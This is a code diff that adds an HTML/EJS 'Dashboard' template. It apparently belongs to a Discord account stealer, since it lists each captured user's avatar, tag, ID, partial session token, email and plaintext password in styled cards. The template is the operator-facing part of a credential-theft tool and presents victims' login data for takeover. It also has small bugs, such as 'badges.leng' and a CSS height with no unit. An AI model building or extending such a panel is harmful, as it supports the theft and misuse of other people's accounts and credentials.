@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+</head>
+<body>
+    <% if (data.length) { %>
+        <% data.forEach(function(d) { %>
+            <div class="card">
+                <img class="user_avatar" src="https://cdn.discordapp.com/avatars/<%= d.id %>/<%= d.avatar %>?size=512" width="130" height="130">
+                <h3 class="text-align"><%= d.tag %> (<%= d.id %>)</h3>
+                <p><%= d.token.substring(0, 24) %>...</p>
+                <p>Email: <%= d.email %></p>
+                <p>Password: <%= d.password %></p>
+                <% if (d.badges.leng) { %>
+                    <p>Badges:</p>
+                    <% d.badges.forEach(function(b) { %>
+                        <img src="<%= b %>" alt="">
+                    <% }) %>
+                <% } else { %>
+                    <p>Badges: None</p>
+                <% } %>
+            </div>
+        <% }) %>
+    <% } else { %>
+        <h3 class="no-account">You don't have an account</h3>
+    <% } %>
+</body>
+</html>
+
+<style>
+    body{
+    font-family: 'Calibri (Corps)', sans-serif;
+    background-color: #2f3136;
+}
+.card {
+    border-radius: 30px;
+    width: 18%;
+    height: 60;
+    text-align: center;
+    color: white;
+    padding: 8px;
+    border: solid;
+    border-color: #5865F2;
+    background-color: #1A191C;
+}
+.user_avatar {
+    border-radius: 120px;
+}
+
+.no-account{
+    text-align: center;
+    color: white;
+    font-size: 1000%;
+}
+
+</style>
